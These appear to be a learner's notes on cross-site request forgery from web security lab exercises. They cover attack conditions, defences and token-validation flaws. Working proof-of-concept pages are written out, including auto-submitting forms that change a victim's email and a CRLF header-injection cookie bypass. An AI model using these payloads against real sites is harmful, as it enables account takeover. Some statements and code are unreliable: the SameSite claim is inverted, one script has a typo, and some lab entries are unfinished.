Means - cross site request forgery.

This vulnerability allows the attacker to perform actions that the users did not intend to perform.
As the name suggests cross-site meaning interaction between two sites is possible when attacker circumvents same origin policy.

That is a flag you sometimes see when inspecting http requests in network traffic for web apps.
For example something like this `Referrer Policy - strict-origin-when-cross-origin` and all else.

The example of an attack could be tampering with the url and requesting actions with parameters that are vulnerable.
Consequences of this vulnerability can be for example, account takeover via email change/ password change and in worst scenario when admin account is compromised to take full control of the said web app.


#### This attack is only possible if these conditions are met:

- A relevant action - a goal in mind that this vuln can achieve - like the examples before - psw change etc..
- Cookie session handling - If there are no other mechanisms in place that identify the user who sent the request - if only the cookie is an identifier.
- No unpredictable request parameters - In short - if you need a piece of information to perform an attack that is not available to you, then it's not really vulnerable (at least for impact).


So an example of a function that meets the conditions of being vulnerable to CSRF.
To make that action user makes a http request like this...

```http
POST /email/change HTTP/1.1 
Host: vulnerable-website.com 
Content-Type: application/x-www-form-urlencoded
Content-Length: 30
Cookie: session=yvthwsztyeQkAPzeQ5gHgTvlyxHfsAfE

email=wiener@normal-user.com
```

We got:
- A relevant action - email that is connected to an account.
- Cookie session handling - the cookie is the only identifier of the request sender.
- No unpredictable request params - only the email is a request parameter - in this case we choose a new email to attach to the account (i think).


When we determine this, we can construct a web page with the following contents:
```html
<html>
<body>
<form action="https://vulnerable-website.com/email/change" method="POST">
<input type="hidden" name="email" value="pwned@evil-user.net" />
</form>
<script> document.forms[0].submit(); </script> 
</body>
</html>
```

If a victim visits the attackers web page this is what happens:
- The attackers page will trigger an http request to the vulnerable site.
- If the user is already logged in to the vulnerable site the browser will automatically fill in the cookie in the request (if SameSite cookies are used).
- The vulnerable site will process the request as usual as if the proxy attacker page doesn't even exist and change the email of the account.

Now if the user can authenticate without action along side the cookie such as basic HTTP auth and cert based auth.
The site is still vulnerable because that data is passed alongside cookie without user interaction.

#### Practical lab

The lab had a app vulnerable to the CSRF of course and the solution was to utilize discussed forged html which contains url for email change to the vulnerable web app with correct http method and our attacker email as a payload, which is all send after we deploy this html on our server and user visits the web page, then the email is updated to our email.

Note.
If the app is vulnerable to csrf and it's possible to change email via GET request you don't need to setup an malicious  proxy server with html, the exploit will work with just a tampered url, exactly the same how a reflected XSS can be stored in url.
`<img src="https://vulnerable-website.com/email/change?email=pwned@evil-user.net">` 

####  Defense against CSRF

- CSRF Token - is a unique value, generated by the server and shared with the client - when performing a sensitive task the client must include the CSRF token. 
- SameSite cookies - Is a browser feature that stops requests with cookies that originate from other sites. 
- Referer-based validation - This is an http header `Referer`, which verifies that the request originates from the applications own domain, less effective than csrf token.

**Csrf tokens can be included in the malicious html**
```html
<form name="change-email-form" action="/my-account/change-email" method="POST">
<label>Email</label>
<input required type="email" name="email" value="example@normal-website.com"> 
<input required type="hidden" name="csrf" value="50FaWgdOhi9M9wyna8taR1k3ODOR8d6u">
<button class='button' type='submit'> Update email </button>
</form>
```

After submitting this form the following request is sent.
```http
POST /my-account/change-email HTTP/1.1
Host: normal-website.com
Content-Length: 70
Content-Type: application/x-www-form-urlencoded

csrf=50FaWgdOhi9M9wyna8taR1k3ODOR8d6u&email=example@normal-website.com
```

CSRF tokens don't have to be sent in a POST request some applications place tokens in http headers.
The way in which the token is sent impacts the security of it.

#### Flaws in CSRF Tokens

- Some applications validate the token when request uses `POST` method but fail to do so with `GET` method.
**LAB** - Exploit the flawed CSRF token validation by using a different http request method.

- In some cases token validation fails if the token is omitted, in this situation the attacker removes the entire parameter, not just the value.
**LAB** - Exploit the flawed CSRF token validation by omitting the token parameter.

- Token is not tied to user session - tokens are compared to the pool of all tokens and the attacker uses their own token when attacking others account.
- Additionally this can be abused across the domain by setting cookies on a different part of the domain - that is if the cookie scope encapsulates it.
**LAB** - Make your own CSRF token and utilize it to change email of other account.

- Token is tied to a non session cookie - this can happen when app uses different frameworks for sessions and CSRF protection.
**LAB** - Getting 504 err, but I think we utilize...

- Token is duplicated in a cookie - in this case attacker only has to invent a token that is in somewhat correct format - actual token is passed in a cookie.
**LAB** - Getting 504 err, but I think we utilize.


```http
POST /email/change HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 68
Cookie: session=1DQGdzYbOJQzLP7460tfyiv3do7MjyPw; csrf=R8ov2YBfTYmzFyjit8o2hKBuoIjXXVpa

csrf=R8ov2YBfTYmzFyjit8o2hKBuoIjXXVpa&email=wiener@normal-user.com
```

**LAB** - change email address of victim bypass double submit defense. Token is duplicated in cookie.
Utilize a search parameter to inject a http header.
And using exploit server change the password.
The only thing that matters is that the CSRF token and CSRF cookie match.

The http header injection happens because the http request is dynamically generated with parameters from the URL request.

```http
GET /?search=test%0d%0aMyHeader:%20MyValue HTTP/1.1
```

This is an example of http header injection.
We have newline after "test" and space, those are the URL encoded characters.
Using this header injection we can set the cookie value of the CSRF token to something simple.
And the reuse that CSRF token value for the body of the request.

```html
<html>
	<body>
	<script>history.pushState('','','/')</script>
		<form action="change_email_url" method="POST">
		<input type="hidden" name="email" value="test3&#64;test&#46;ca" />
		<input type="hidden" name="csrf" value="test" />
		<input type="submit" value="Submit request" />
		<img src="url_with_http_header_injection" onerror="document.froms[0].submit()">
	</body>
</html>
```

```html
<html>
	<body>
	<script>history.pushState('','','/')</script>
		<form action="https://0af000340469358a8115664d00d600ad.web-security-academy.net/my-account/change-email" method="POST">
		<input type="hidden" name="email" value="test3&#64;test&#46;ca" />
		<input type="hidden" name="csrf" value="test" />
		<input type="submit" value="Submit request" />
		<img src="https://0af000340469358a8115664d00d600ad.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf-test" onerror="document.froms[0].submit()">
	</body>
</html>
```

test